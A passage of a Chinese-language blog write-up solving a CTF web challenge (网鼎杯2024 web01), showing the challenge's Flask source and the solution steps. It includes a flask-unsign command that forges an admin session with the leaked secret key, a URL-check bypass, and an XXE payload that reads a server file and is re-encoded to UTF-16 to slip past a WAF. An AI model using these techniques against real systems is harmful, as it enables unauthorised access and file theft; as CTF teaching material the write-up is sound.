class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        flash(<span class="string">&#x27;Please login first&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    payload = decode_jwt(token)</span><br><span class="line">    form = UploadForm()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload <span class="keyword">or</span> payload[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        error_message = <span class="string">&#x27;You do not have permission to access this page. Your username is not admin.&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>, form=form, error_message=error_message, username=payload[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session[<span class="string">&#x27;role&#x27;</span>] <span class="keyword">or</span> session[<span class="string">&#x27;role&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        error_message = <span class="string">&#x27;You do not have permission to access this page. Your role is not admin.&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>, form=form, error_message=error_message, username=payload[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        file = form.avatar.data</span><br><span class="line">        <span class="keyword">if</span> file:</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            files = &#123;<span class="string">&#x27;file&#x27;</span>: (filename, file.stream, file.content_type)&#125;</span><br><span class="line">            php_service_url = <span class="string">&#x27;http://127.0.0.1/upload.php&#x27;</span></span><br><span class="line">            response = requests.post(php_service_url, files=files)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                flash(response.text, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flash(<span class="string">&#x27;Failed to upload file to PHP service&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>, form=form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/view_uploads&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_uploads</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    form = GameForm()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        error_message = <span class="string">&#x27;Please login first&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;view_uploads.html&#x27;</span>, form=form, error_message=error_message)</span><br><span class="line">    payload = decode_jwt(token)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload:</span><br><span class="line">        error_message = <span class="string">&#x27;Invalid or expired token. Please login again.&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;view_uploads.html&#x27;</span>, form=form, error_message=error_message)</span><br><span class="line">    <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        error_message = <span class="string">&#x27;You do not have permission to access this page. Your username is not admin&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;view_uploads.html&#x27;</span>, form=form, error_message=error_message)</span><br><span class="line">    user_input = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        filepath = form.user_input.data</span><br><span class="line">        pathurl = request.form.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;www.testctf.com&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> pathurl) <span class="keyword">or</span> (<span class="string">&quot;127.0.0.1&quot;</span> <span class="keyword">in</span> pathurl) <span class="keyword">or</span> (<span class="string">&#x27;/var/www/html/uploads/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> filepath) <span class="keyword">or</span> (<span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filepath):</span><br><span class="line">            error_message = <span class="string">&quot;www.testctf.com must be in path and /var/www/html/uploads/ must be in filepath.&quot;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;view_uploads.html&#x27;</span>, form=form, error_message=error_message)</span><br><span class="line">        params = &#123;<span class="string">&#x27;s&#x27;</span>: filepath&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(<span class="string">&quot;http://&quot;</span> + pathurl, params=params, timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;view_uploads.html&#x27;</span>, form=form, user_input=response.text)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            error_message = <span class="string">&quot;500! Server Error&quot;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;view_uploads.html&#x27;</span>, form=form, error_message=error_message)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;view_uploads.html&#x27;</span>, form=form, user_input=user_input)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    response = make_response(redirect(url_for(<span class="string">&#x27;login&#x27;</span>)))</span><br><span class="line">    response.delete_cookie(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    flash(<span class="string">&#x27;You have been logged out&#x27;</span>, <span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>由源码可以知道 flask的session密钥</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;36f8efbea152e50b23290e0ed707b4b0&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h3><p>直接拿着 密钥伪造特定权限即可</p>
+<p>通过 flask-unsign 伪造 role权限 为 <code>admin</code>即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;_flashes&#x27;: [(&#x27;success&#x27;, &#x27;Login successful!&#x27;)], &#x27;csrf_token&#x27;: &#x27;eedffbc0898223ee6d7f732cb516c51f6d0e5c92&#x27;, &#x27;role&#x27;: &#x27;admin&#x27;&#125;&quot; --secret &quot;36f8efbea152e50b23290e0ed707b4b0&quot; --no-literal-eval</span><br></pre></td></tr></table></figure>
+
+<p>可以尝试发现 <code>token</code> 控制 <code>username</code> ,<code>session</code>控制 <code>role</code> 我们如果想使用 <code>Upload Avatar</code> 功能 考虑Username&#x2F;Role 都为 admin 成功伪造session(flask) token(jwt)</p>
+<p><img src="/../images/20250607191006991.png" alt="image-20250607191006991"></p>
+<p>现在我们可以访问 Upload Avatar 实现文件上传</p>
+<h2 id="文件上传-XXE（utf-16绕过）"><a href="#文件上传-XXE（utf-16绕过）" class="headerlink" title="文件上传-XXE（utf-16绕过）"></a>文件上传-XXE（utf-16绕过）</h2><p><img src="/../images/20250607191035122.png" alt="image-20250607191035122"></p>
+<p>随便上传个文件：</p>
+<p><img src="/../images/20250607191116463.png" alt="image-20250607191116463"></p>
+<p>重命名了而且后缀没了[傻眼了]</p>
+<p>通过 view_uploads 进行访问对应文件</p>
+<p>但是提示必须要</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.testctf.com must be in path and /var/www/html/uploads/ must be in filepath.</span><br></pre></td></tr></table></figure>
+
+<p>可控两个参数 <code>pathurl</code>和 <code>filepath</code></p>
+<p>1.<code>pathurl</code>必须要包含 <code>www.testctf.com</code> 直接把 <code>www.testctf.com</code> 放在get传参中绕过 <code>localhost?a=www.testctf.com</code> 2.<code>filepath</code> 是 文件上传的文件路径 简单Fuzzing一下发现</p>
+<p><img src="/../images/20250607191325066.png" alt="image-20250607191325066"></p>
+<p>成功绕过但是报错Failed Load XML 证明该处会加载XML文件 上传一个XXE进行读文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt; </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///vat/www/html/flag.php&quot; &gt;]&gt; </span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt; </span><br><span class="line">    &lt;pass&gt;mypass&lt;/pass&gt; </span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
+
+<p>返回hacker</p>
+<p>存在waf</p>
+<p><strong>被拦截 xxe的绕过方式无非就那么几种 xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码 可以尝试通过utf-16编码绕过 正则匹配WAF</strong></p>
+<p>原文件内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/flag.php&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">    &lt;pass&gt;J1rrY&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在linux环境下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f UTF-8 -t UTF-16 xxe.xml -o xxe_16.xml</span><br></pre></td></tr></table></figure>
+
+<p>然后上传</p>
+<p>然后在 <code>view_uploads</code> 实现 xml解析</p>
+<p><img src="/../images/20250607191533070.png" alt="image-20250607191533070"></p>
+<p>将生成的base64解码得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/RS256%E5%BC%B1%E5%85%AC%E9%92%A5jwt%E4%BC%AA%E9%80%A0/" rel="tag">RS256弱公钥jwt伪造</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/flask-session%E4%BC%AA%E9%80%A0/" rel="tag">flask session伪造</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/xxe%E9%80%9A%E8%BF%87utf16%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" rel="tag">xxe通过utf16绕过黑名单实现任意文件读取</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/1715139851115171513985117.jpg" data-sizes="auto" alt="网鼎杯2024青龙组web02复现" class="lazyload">
+          
+        
+        <a href="/2025/06/07/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84web02%E5%A4%8D%E7%8E%B0/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            网鼎杯2024青龙组web02复现
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/124691006_p0_master1200.jpg" data-sizes="auto" alt="[网鼎杯 2020 总决赛]Game Exp" class="lazyload">
+        
+      
+      <a href="/2025/06/07/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%80%BB%E5%86%B3%E8%B5%9B%5DGame%20Exp/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [网鼎杯 2020 总决赛]Game Exp
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        284k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        20:48
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jwt%E5%92%8Csession%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">jwt和session分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jwt%E5%92%8Csession%E4%BC%AA%E9%80%A0-%E9%87%8D%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">jwt和session伪造(重点)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-RS256-%E5%8A%A0%E5%AF%86%E7%9A%84jwt-%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">伪造 RS256 加密的jwt 实现数据篡改：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E4%BC%AA%E9%80%A0"><span class="toc-number">3.2.</span> <span class="toc-text">session伪造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XXE%EF%BC%88utf-16%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">文件上传-XXE（utf-16绕过）</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "网鼎杯2024青龙组web01复现",
+          url: "http://example.com/2025/06/07/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84web01%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: "  这题看着挺有趣的，毕竟我没见过多少web题和crypto一起考的 当然我没报名肯定做不了，结合着题解来做 题目分析题目描述：  进去是一个登录框  没做验证任意可登录，但是admin无法登陆进去 登录进去之后：  除了登出按键，这四个按键对应四个路由： 1234/profile/game/upload/view_uploads  profile:  game:  upload:  view_upload: jwt和session分析Cookie中设置了 token(jwt) 和 sessio",
+          date: "Sat Jun 07 2025 18:32:26 GMT+0800",
+          updated: "Sat Jun 07 2025 19:22:17 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
